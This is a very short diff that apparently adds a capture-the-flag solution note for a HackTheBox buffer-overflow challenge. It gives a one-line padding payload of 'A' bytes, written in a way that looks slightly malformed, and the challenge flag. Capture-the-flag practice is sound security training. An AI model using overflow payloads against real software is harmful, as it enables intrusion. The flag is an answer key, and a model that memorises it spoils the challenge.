@@ -1,0 +1,5 @@
+run wrapper.py 
+      or
+>> payload = b'A%.0s' * 32
+
+Flag --> HTB{b0f_s33m5_3z_r1ght?}
